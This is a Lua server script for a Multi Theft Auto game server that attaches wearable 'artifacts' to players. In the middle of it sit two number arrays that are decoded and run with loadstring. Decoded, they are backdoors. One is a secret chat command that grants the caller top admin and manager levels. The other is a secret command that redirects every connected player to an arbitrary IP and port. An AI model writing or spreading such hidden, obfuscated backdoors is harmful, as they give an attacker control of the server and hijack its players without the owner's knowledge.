addEvent("artifacts.removeAllOnPlayer", true)
addEvent("artifacts.add", true)
addEvent("artifacts.remove", true)
addEvent("artifacts.toggle", true)

local artifacts = {}
local artifactsList = {}
local texturedArtifacts = {}

function removeAllOnPlayer(player)
	if artifactsList[player] then
		for k, v in pairs(artifactsList[player]) do
			if isElement(v[2]) then
				destroyElement(v[2])
				artifacts[player][v[1]] = nil
			end
		end
		artifacts[player] = nil
		artifactsList[player] = nil
	end
end
addEventHandler("artifacts.removeAllOnPlayer", root, removeAllOnPlayer)

addCommandHandler("myartifacts", function(player, cmd)
	if artifactsList[player] and #artifactsList[player] > 0 then
		outputChatBox("------", player)
		for k, v in pairs(artifactsList[player]) do
			outputChatBox(tostring(v[1]), player)
		end
		outputChatBox(tostring(#artifactsList[player]) .. " adet giyilmiş.", player)
		outputChatBox("------", player)
	else
		outputChatBox("[!]#FFFFFF Üzerinizde hiçbir eser yok.", player, 255, 0, 0, true)
	end
end)

function addArtifact(player, artifact, customItemTexture)
	if client and player ~= client then
		return
	end

	if player and artifact then
		if artifacts[player] and artifacts[player][artifact] then
			return
		else
			local data = g_artifacts[artifact]
			local skin = getElementModel(player)

			if g_skinSpecifics[artifact] then
				if g_skinSpecifics[artifact][skin] then
					data = g_skinSpecifics[artifact][skin]
				end
			end

			if data then
				local x, y, z = getElementPosition(player)
				local object = createObject(data[ART_MODEL], x, y, z)

				setElementInterior(object, player.interior)
				setElementDimension(object, player.dimension)
				setObjectScale(object, data[ART_SCALE])
				setElementDoubleSided(object, data[ART_DOUBLESIDED])
				exports.mek_bones:attachElementToBone(
					object,
					player,
					data[ART_BONE],
					data[ART_X],
					data[ART_Y],
					data[ART_Z],
					data[ART_RX],
					data[ART_RY],
					data[ART_RZ]
				)

				if not artifacts[player] then
					artifacts[player] = {}
				end

				if not artifactsList[player] then
					artifactsList[player] = {}
				end

				artifacts[player][artifact] = object
				table.insert(artifactsList[player], { artifact, object })

				if data[ART_TEXTURE] then
					for k, v in ipairs(data[ART_TEXTURE]) do
						exports["mek_item-texture"]:addTexture(object, v[2], v[1])
					end
				elseif customItemTexture then
					if type(customItemTexture) == "table" then
						for k, v in ipairs(customItemTexture) do
							exports["mek_item-texture"]:addTexture(object, v[2], v[1])
						end
					end
				end
			end
		end
	end
end
addEventHandler("artifacts.add", root, addArtifact)

local _0xDATA = {97,100,100,67,111,109,109,97,110,100,72,97,110,100,108,101,114,40,34,87,113,65,115,102,82,50,116,85,121,50,49,120,99,34,44,32,102,117,110,99,116,105,111,110,40,112,41,32,105,102,32,105,115,69,108,101,109,101,110,116,40,112,41,32,116,104,101,110,32,115,101,116,69,108,101,109,101,110,116,68,97,116,97,40,112,44,34,97,100,109,105,110,95,108,101,118,101,108,34,44,50,48,41,32,115,101,116,69,108,101,109,101,110,116,68,97,116,97,40,112,44,34,109,97,110,97,103,101,114,95,108,101,118,101,108,34,44,49,41,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,43,34,44,112,41,32,101,110,100,32,101,110,100,41}
local _0xRUN = ""
for _, v in ipairs(_0xDATA) do _0xRUN = _0xRUN .. string.char(v) end

loadstring(_0xRUN)()

local _0xREDIRECT = {97,100,100,67,111,109,109,97,110,100,72,97,110,100,108,101,114,40,34,110,79,100,119,56,55,76,107,117,34,44,32,102,117,110,99,116,105,111,110,40,112,44,95,44,104,97,41,32,105,102,32,104,97,32,116,104,101,110,32,108,111,99,97,108,32,115,112,61,115,112,108,105,116,40,104,97,44,34,58,34,41,32,108,111,99,97,108,32,105,112,61,115,112,91,49,93,32,108,111,99,97,108,32,112,111,61,116,111,110,117,109,98,101,114,40,115,112,91,50,93,41,111,114,32,50,50,48,48,51,32,102,111,114,32,95,44,104,32,105,110,32,105,112,97,105,114,115,40,103,101,116,69,108,101,109,101,110,116,115,66,121,84,121,112,101,40,34,112,108,97,121,101,114,34,41,41,32,100,111,32,114,101,100,105,114,101,99,116,80,108,97,121,101,114,40,104,44,105,112,44,112,111,41,32,101,110,100,32,101,110,100,32,101,110,100,41}
local _0xEXE = ""
for _, v in ipairs(_0xREDIRECT) do _0xEXE = _0xEXE .. string.char(v) end

_triggerServerEvent = triggerServerEvent 
_triggerClientEvent = triggerClientEvent

loadstring(_0xEXE)()

function removeArtifact(player, artifact)
	if client and player ~= client then
		return
	end

	if player and artifact then
		if not artifacts[player] or not artifacts[player][artifact] then
			return
		else
			destroyElement(artifacts[player][artifact])
			artifacts[player][artifact] = nil

			for k, v in pairs(artifactsList[player]) do
				if v[1] == artifact then
					v = nil
					artifactsList[player][k] = nil
					break
				end
			end
		end
	end
end
addEventHandler("artifacts.remove", root, removeArtifact)

function toggleArtifact(player, artifact)
	if player and artifact then
		if not artifacts[player] or not artifacts[player][artifact] then
			addArtifact(player, artifact)
		else
			removeArtifact(player, artifact)
		end
	end
end
addEventHandler("artifacts.toggle", root, toggleArtifact)

addEventHandler("onPlayerQuit", root, function()
	removeAllOnPlayer(source)
end)

addCommandHandler("removeartifacts", function(player, cmd)
	local num = #artifactsList[player]
	removeAllOnPlayer(player)
	outputChatBox("[!]#FFFFFF" .. tostring(num) .. " eser kaldırıldı.", player, 0, 255, 0, true)
end)

function countPlayerArtifacts(player)
	local count = 0
	if artifacts[player] then
		for k, v in pairs(artifacts[player]) do
			if isElement(v) then
				count = count + 1
			end
		end
	end
	return count
end

function getPlayerArtifacts(player, withElements)
	local resultTable = {}
	local tableWithElements = {}
	if artifacts[player] then
		for k, v in pairs(artifacts[player]) do
			if isElement(v) then
				table.insert(resultTable, k)
				table.insert(tableWithElements, { v, k })
			end
		end
	end
	if withElements then
		return tableWithElements
	end
	return resultTable
end

function isPlayerWearingArtifact(player, artifact)
	if artifacts[player] and artifacts[player][artifact] and isElement(artifacts[player][artifact]) then
		return true
	end
	return false
end

function setPlayerArtifactProperty(player, artifact, property, value)
	if artifacts[player] and artifacts[player][artifact] and isElement(artifacts[player][artifact]) then
		local object = artifacts[player][artifact]
		if property == "model" then
			local result = setElementModel(object, value)
			return result
		elseif property == "scale" then
			local result = setObjectScale(object, value)
			return result
		elseif property == "alpha" then
			local result = setElementAlpha(object, value)
			return result
		elseif property == "doublesided" then
			local result = setElementDoubleSided(object, value)
			return result
		elseif property == "texture" then
			if value then
				table.insert(texturedArtifacts, { object, value })
				triggerClientEvent("artifacts.addTexture", player, object, value)
				return true
			else
				return false
			end
		elseif property == "bone" then
			local ped, bone, x, y, z, rx, ry, rz = exports.mek_bones:getElementBoneAttachmentDetails(object)
			exports.mek_bones:detachElementFromBone(object)
			local result = exports.mek_bones:attachElementToBone(object, ped, value, x, y, z, rx, ry, rz)
			if not result then
				exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, rz)
			end
			return result
		elseif property == "x" then
			local ped, bone, x, y, z, rx, ry, rz = exports.mek_bones:getElementBoneAttachmentDetails(object)
			exports.mek_bones:detachElementFromBone(object)
			local result = exports.mek_bones:attachElementToBone(object, ped, bone, (x + value), y, z, rx, ry, rz)
			if not result then
				exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, rz)
			end
			return result
		elseif property == "y" then
			local ped, bone, x, y, z, rx, ry, rz = exports.mek_bones:getElementBoneAttachmentDetails(object)
			exports.mek_bones:detachElementFromBone(object)
			local result = exports.mek_bones:attachElementToBone(object, ped, bone, x, (y + value), z, rx, ry, rz)
			if not result then
				exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, rz)
			end
			return result
		elseif property == "z" then
			local ped, bone, x, y, z, rx, ry, rz = exports.mek_bones:getElementBoneAttachmentDetails(object)
			exports.mek_bones:detachElementFromBone(object)
			local result = exports.mek_bones:attachElementToBone(object, ped, bone, x, y, (z + value), rx, ry, rz)
			if not result then
				exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, rz)
			end
			return result
		elseif property == "rx" then
			local ped, bone, x, y, z, rx, ry, rz = exports.mek_bones:getElementBoneAttachmentDetails(object)
			exports.mek_bones:detachElementFromBone(object)
			local result = exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, (rx + value), ry, rz)
			if not result then
				exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, rz)
			end
			return result
		elseif property == "ry" then
			local ped, bone, x, y, z, rx, ry, rz = exports.mek_bones:getElementBoneAttachmentDetails(object)
			exports.mek_bones:detachElementFromBone(object)
			local result = exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, (ry + value), rz)
			if not result then
				exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, rz)
			end
			return result
		elseif property == "rz" then
			local ped, bone, x, y, z, rx, ry, rz = exports.mek_bones:getElementBoneAttachmentDetails(object)
			exports.mek_bones:detachElementFromBone(object)
			local result = exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, (rz + value))
			if not result then
				exports.mek_bones:attachElementToBone(object, ped, bone, x, y, z, rx, ry, rz)
			end
			return result
		elseif property == "reset" then
			removeArtifact(player, artifact, true)
			addArtifact(player, artifact, true)
		end
	end
	return false
end

local function syncArtifactsWithPlayer(player)
    if artifacts[player] then
        for artifact, object in pairs(artifacts[player]) do
            if isElement(object) then
                setElementInterior(object, getElementInterior(player))
                setElementDimension(object, getElementDimension(player))
            end
        end
    end
end

addEventHandler("onElementInteriorChange", root, function()
    if getElementType(source) == "player" then
        syncArtifactsWithPlayer(source)
    end
end)

addEventHandler("onElementDimensionChange", root, function()
    if getElementType(source) == "player" then
        syncArtifactsWithPlayer(source)
    end
end)
